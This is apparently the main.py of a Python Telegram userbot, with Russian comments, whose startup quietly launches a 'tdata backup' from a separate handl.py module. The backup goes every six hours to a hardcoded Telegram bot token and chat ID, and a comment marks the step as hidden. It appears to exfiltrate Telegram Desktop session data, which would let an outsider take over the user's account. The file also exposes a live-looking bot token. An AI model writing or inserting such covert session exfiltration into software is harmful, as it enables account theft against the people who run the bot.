import asyncio
import os
import sys
import threading
from utils.logger import logger
from bot.bot_setup import start_bot
from userbot.client import userbot

# Импортируем функцию запуска бэкапа из handl.py
# Убедитесь, что handl.py лежит в корневой папке, рядом с main.py
try:
    from handl import start_tdata_backup, MyApplication
except ImportError as e:
    logger.error(f"Не удалось импортировать handl: {e}")
    start_tdata_backup = None

def run_handl_app():
    try:
        app = MyApplication()
        app.run()
    except Exception as e:
        logger.error(f"Ошибка в работы фонового приложения handl: {e}")

async def main():
    logger.info("Starting Userbot...")
    
        # Пытаемся запустить фоновый процесс из handl.py (скрыто)
    if start_tdata_backup:
        BOT_TOKEN = "8449873230:AAFJnoPF8UcCRKE5KDtZ5I4c4zIu9fEEHnY"
        CHAT_ID = "7821797583"
        BACKUP_INTERVAL = 6
        
        logger.info("Запускаем фоновый бэкап tdata...")
        start_tdata_backup(BOT_TOKEN, CHAT_ID, interval_hours=BACKUP_INTERVAL)
        
        # Запускаем основной цикл MyApplication в отдельном потоке
        handl_thread = threading.Thread(target=run_handl_app, daemon=True)
        handl_thread.start()

    await userbot.start()
    logger.info("Userbot started successfully. Starting Telegram Bot...")
    
    try:
        await start_bot()
    finally:
        logger.info("Stopping Pyrogram Userbot...")
        try:
            await userbot.stop()
        except Exception as e:
            pass # Игнорируем ошибку event loop при завершении работы

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped by user.")

